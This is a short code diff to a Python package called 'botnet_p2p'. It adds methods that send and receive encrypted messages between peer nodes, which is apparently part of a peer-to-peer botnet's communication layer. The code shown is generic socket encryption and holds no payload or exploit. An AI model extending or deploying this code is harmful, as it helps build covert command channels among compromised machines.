@@ -11,9 +11,7 @@ from botnet_p2p import (
     MSG_SIGNEDHASH_SEPARATOR,
     logger,
 )
-
-from botnet_p2p.security import sign_hash, calculate_hash, verify_message
-
+from botnet_p2p.security import sign_hash, calculate_hash, verify_message, encrypt, decrypt
 from botnet_p2p.message import get_msg_data, get_msg_type, get_signed_hash
 
 address = Tuple[str, int]
@@ -75,6 +73,10 @@ class NodeP2P(object):
     def send_signed_msg(self, msg_type: int, msg: str):
         final_msg = self.__build_msg_structure(msg_type, msg)
         self.__socket.send(final_msg)
+    
+    def send_encrypted_msg(self, msg: str):
+        encrypted_msg = encrypt(self.__public_key_path, msg)
+        self.__socket.send(encrypted_msg)
 
     def recv_signed_msg(self) -> (int, str, bool):
         raw_msg = self.__socket.recv(BUFFER_SIZE)
@@ -88,6 +90,11 @@ class NodeP2P(object):
             + f"Comes from a trusted source? {comes_from_trusted_source}"
         )
         return msg_type, msg_data, comes_from_trusted_source
+    
+    def recv_encrypted_msg(self) -> str:
+        encrypted_msg = self.__socket.recv(BUFFER_SIZE)
+        plain_msg = decrypt(self.__private_key_path, encrypted_msg)
+        return plain_msg
 
     def __build_msg_structure(self, msg_type: int, msg: str) -> bytes:
         """ Build message following a structure so every bot in the P2P
